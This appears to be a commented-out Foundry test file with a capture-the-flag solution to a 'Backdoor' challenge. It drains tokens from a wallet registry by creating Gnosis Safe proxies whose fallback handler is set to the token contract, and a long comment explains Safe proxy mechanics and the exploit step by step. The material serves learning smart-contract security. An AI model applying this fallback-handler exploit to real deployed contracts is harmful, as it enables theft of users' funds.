// // SPDX-License-Identifier: MIT
// pragma solidity 0.8.21;

// import "forge-std/Test.sol";
// import {Utilities} from "./Utilities.sol";
// import {MockERC20} from "../mocks/MockERC20.sol";
// import {WalletRegistry} from "../../src/Week17-18/Backdoor/WalletRegistry.sol";
// import {Safe} from "@gnosis/contracts/Safe.sol";
// import {SafeProxy} from "@gnosis/contracts/proxies/SafeProxy.sol";
// import {SafeProxyFactory} from "@gnosis/contracts/proxies/SafeProxyFactory.sol";

// //forge test --mc BackdoorTest -vvvv --via-ir
// contract BackdoorTest is Test {
//     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
//     uint256 internal constant NUM_USERS = 4;
    
//     Utilities internal utils;
//     MockERC20 internal dvt;
//     Safe internal masterCopy;
//     SafeProxyFactory internal walletFactory;
//     WalletRegistry internal walletRegistry;

//     address[] internal users;
//     address payable internal attacker;
//     address internal alice;
//     address internal bob;
//     address internal charlie;
//     address internal david;

//     address[] beneficiaries;

//     function setUp() public {
//         /**
//          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
//         */

//         utils = new Utilities();
//         users = utils.createUsers(NUM_USERS);

//         alice = users[0];
//         bob = users[1];
//         charlie = users[2];
//         david = users[3];

//         vm.label(alice, "Alice");
//         vm.label(bob, "Bob");
//         vm.label(charlie, "Charlie");
//         vm.label(david, "David");

//         attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
//         vm.label(attacker, "Attacker");

//         // Deploy Gnosis Safe masterCopy and factory contracts
//         masterCopy = new Safe();
//         vm.label(address(masterCopy), "Gnosis Safe");

//         walletFactory = new SafeProxyFactory();
//         vm.label(address(walletFactory), "Wallet Factory");

//         dvt = new MockERC20();
//         vm.label(address(dvt), "DVT");

//         // Deploy the registry
//         walletRegistry = new WalletRegistry(
//             address(masterCopy),
//             address(walletFactory),
//             address(dvt),
//             users
//         );
        
//         // Users are registered as beneficiaries
//         for (uint256 i = 0; i < NUM_USERS; i++) {
//             assertTrue(walletRegistry.beneficiaries(users[i]));
//         }

//         // Transfer tokens to the registry so they can be distributed to the `Safe` wallet
//         dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

//         console.log(unicode"🧨 Let's see if you can break it... 🧨");
//     }

//     function testExploit() public {
//         /**
//          * EXPLOIT START *
//         */
//         beneficiaries.push(alice);
//         beneficiaries.push(bob);
//         beneficiaries.push(charlie);
//         beneficiaries.push(david);
//         address[] memory _owners = new address[](1);

//         for (uint256 i = 0; i < beneficiaries.length; i++) {
//             //Each beneficary needs to create a `Safe` wallet. In `setup` for `Safe`, the `_owners` param takes an array.
//             _owners[0] = beneficiaries[i];

//             //Construct initializer calldata for `createProxyWithCallback`
//             //Pass in the address of the token as the `fallbackHandler` in the `setup` function
//             //so that we can execute our exploit and execute calls to the token contract by forwarding
//             //fallback calls to the token contract through the `Safe` wallet.
//             bytes memory initializer = abi.encodeWithSignature(
//                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
//                 _owners,       //_owners: `Safe` owners
//                 1,             //_threshold: Number of required confirmations for a Safe transaction
//                 address(0),    //to: Address for optional delegate call
//                 "",            //data: Data payload for optional delegate call
//                 address(dvt),  //fallbackHandler: Handles fallback calls to the Safe wallet
//                 address(0),    //paymentToken: Token to be used for the payment (0 == ETH)
//                 0,             //payment: Amount that should be paid
//                 address(0)     //paymentReceiver: Address that should receive the payment
//             );

//             //Create a wallet through the factory, which sets up the `SafeProxy` linked to a `Safe` wallet implementation
//             //and then calls the `proxyCreated` callback in the registry.
//             SafeProxy proxy = walletFactory.createProxyWithCallback(
//                 address(masterCopy), //singleton
//                 initializer,         //initializer: payload for a message call to be sent to the new proxy contract.
//                 1,                   //saltNonce: used to generate the salt to calc the address of the new proxy contract. 
//                 walletRegistry       //callback: Address containing the callback that will be invoked
//             );
            
//             //Exploit through the fallback
//             vm.prank(attacker);
//             address(proxy).call(
//                 abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED / 4)
//             );
//         }
//         /**
//          * EXPLOIT END *
//         */

//         validation();
//         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
//     }

//     function validation() internal {
//         /**
//          * SUCCESS CONDITIONS
//          */
//         for (uint256 i = 0; i < NUM_USERS; i++) {
//             address wallet = walletRegistry.wallets(users[i]);

//             // User must have registered a wallet
//             if (wallet == address(0)) {
//                 emit log("User did not register a wallet");
//                 fail();
//             }

//             // User is no longer registered as a beneficiary
//             assertTrue(!walletRegistry.beneficiaries(users[i]));
//         }

//         // Attacker must have taken all tokens
//         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
//     }
// }

/// High level overview of how Gnosis safe contracts work: Safe.sol, SafeProxy.sol, SafeProxyFactory.sol:
/// 1. Safe.sol: The main contract that implements the logic for the Gnosis Safe wallet.
/// 2. SafeProxy.sol: A generic proxy contract that allows to execute all transactions applying the code of a master contract.
///    That is, the SafeProxy contract forwards all transactions to the master contract (Safe.sol).
/// 3. SafeProxyFactory.sol: A factory contract that allows to create a new proxy contract and execute a message 
///    call to the new proxy within one transaction.
/// 4. The `Safe` contract is deployed first, and is also referred to as the `singleton` in `SafeProxFactory` and
///    `SafeProxy` contracts.
/// 5. The `SafeProxyFactory` is deployed next.
/// 6. The `SafeProxyFactory` contract is used to deploy new proxy contracts that point to the `Safe` contract.
///    This can be achieved with `createProxyWithNonce` or `createProxyWithCallback` functions.
/// 7. `createProxyWithCallback` calls `createProxyWithNonce` at first, and the `singleton` address, initializer data, and
///    saltNonce are passed to `createProxyWithNonce`.
/// 8. Within the function, `deployProxy` is called,
///    A. First it checks that the `singleton` is deployed
///    B. Then it constructs the creation code for the `SafeProxy` contract with the `singleton` address encoded as the 
///       argument for the constructor.
///    C. It then deploys the contract with `CREATE2` using the `salt` and the creation code.
///    D. Then it makes a low level call to the deployed `SafeProxy`, with the `initializer` data, which will be
///       forwarded to the `Safe` contract. In this case, it will be the encoded data for the `setUp` function in the
///       `Safe` contract.
///    E. Then, `createProxyWithCallback` will call the `proxyCreated` function in the `callback` contract. This contract
///       must implement the `IProxyCreationCallback` interface.
///
/// Exploit:
/// In this ctf, when a new `Safe` wallet is created, we would expect `proxyCreated` to be called in the `WalletRegistry`.
/// So this should be our focus. The `proxyCreated` function does the following:
/// 1. Checks that the registry has enough balance to pay the token payment.
/// 2. Checks that msg.sender is the SafeProxyFactory address that was set up in its constructor.
/// 3. Checks that the `singleton` address used to create the `SafeProxy` is the same as the `masterCopy` address set in
///    the constructor, which should be pointing to the same `Safe` contract.
/// 4. Checks that the `initializer` data is the encoded data for the `setUp` function in the `Safe` contract.
/// 5. Checks that the `Safe` wallet threshold of required confirmations for a Safe transaction is 1 (MAX_THRESHOLD).
///    And that the number of `Safe` wallet owners is 1 (MAX_OWNERS). Only the wallet owner can execute transactions.
/// 6. Checks that the owner of the wallet is registered as a one of the beneficiary in the registry. This prevents
///    the registry from sending tokens to addresses that are not registered as beneficiaries.
/// 7. It removes the beneficiary from the registry to prevent an address from getting more tokens than intended.
/// 8. Finally, it sends tokens from the registry to the `Safe` wallet.
///
/// Essentially, after `proxyCreated` is called, only a `Safe` wallet that has a beneficiary registered in the registry
/// can receive tokens and only receive once.
/// 
/// Thus the exploit is to deploy a `Safe` wallet, register a beneficiary in the registry, and after the registry transfers
/// the tokens to the `Safe` wallet, we need to transfer those tokens out of the `Safe` wallet to the attacker address.
///
/// The first clue is in the `SafeProxy`. The `SafeProxy` contract has a `fallback` function that forwards all calls to
/// the `singleton` address, which is the `Safe` contract. This means that we can call any arbitrary function to the
/// `SafeProxy`, and it will be forwarded to the `Safe` contract. So this means, ultimately, we may want to try to call
/// a transfer like function to transfer the tokens out of the `Safe` wallet.
///
/// The second clue is in the `setup` function in `Safe`, where a function: `internalSetFallbackHandler` is called. The
/// `setup` function has an argument called `fallbackHandler`. This is the address of a contract that will handle all
/// fallback calls made to the `Safe` wallet.
///
/// If we step into `internalSetFallbackHandler`, we see the `FallbackManager` contract. Presumable, this contract is
/// handling all fallback calls made to the `Safe` wallet. In the `FallbackManager` contract, `internalSetFallbackHandler` 
/// sets the `handler` address in the storage slot `FALLBACK_HANDLER_STORAGE_SLOT`. And in the `fallback` function, we see
/// the call: `call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)`. This means that if the `handler` address is set,
/// we can call any function in the `handler` contract by calling `SafeProxy` and the function will be forwarded to the
/// `handler` contract (as a fallback call).
///
/// So the exploit can succeed if when constructing the `initializer` calldata, we pass in the address of the token contract
/// as the `fallbackHandler` in the `setup` function. This way, when`SafeProxyFactory.createProxyWithCallback` is called
/// with that `initializer` calldata, the `Safe` wallet will be created with the `handler` address set to the token contract.
/// And finally, we call just make a ERC20.transfer call to the `SafeProxy`, which will then be forwarded to the `Safe` wallet,
/// and then to the `handler` contract, which is the token contract.
///
/// The success condition requires a `Safe` wallet to be created for each user, and the attacker address to have all the tokens.